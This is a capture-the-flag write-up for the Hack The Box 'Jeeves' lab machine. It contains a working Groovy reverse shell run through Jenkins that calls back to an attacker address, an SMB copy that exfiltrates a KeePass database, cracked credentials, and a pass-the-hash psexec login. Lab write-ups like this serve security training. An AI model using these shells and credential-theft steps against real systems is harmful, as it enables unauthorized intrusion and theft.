# HTB - Jeeves Writeup

## Reconnaissance
```bash
sudo nmap -Pn -p- -A -T4 10.129.234.197
```

**Results:**
```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
```

## Exploitation
### Jenkins Access
- Discovered Jenkins instance at `http://10.129.234.197:50000/askjeeves`
- Created project with Groovy reverse shell script:
```groovy
String host="10.10.16.39";
int port=1234;
String cmd="cmd";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()) {
  while(pi.available()>0) so.write(pi.read());
  while(pe.available()>0) so.write(pe.read());
  while(si.available()>0) po.write(si.read());
  so.flush();
  po.flush();
  Thread.sleep(50);
  try { p.exitValue(); break; } 
  catch (Exception e) {}
};
p.destroy();
s.close();
```

### Initial Access
- Obtained reverse shell as `kohsuke` user
- Found KeePass database: `C:\Users\kohsuke\Documents\CEH.kdbx`
- Exfiltrated via SMB:
```cmd
copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.16.39\smb\
```

### KeePass Cracking
- Cracked database password with Hashcat:
```bash
hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt
```
**Password:** `moonshine1`

### Database Contents
```
administrator:S1TjAtJHKsugh9oC4VZl
NTLM HASH: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

### Privilege Escalation
- Used credentials with Impacket's psexec:
```bash
impacket-psexec administrator@10.129.234.197 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```
- Obtained SYSTEM-level access

## Flags
### User Flag
```
7b0b********************************
```

### Root Flag
Located in Alternate Data Stream:
```cmd
powershell (Get-Content hm.txt -Stream root.txt)
```
**Root Flag:**  
```
afbc********************************
```
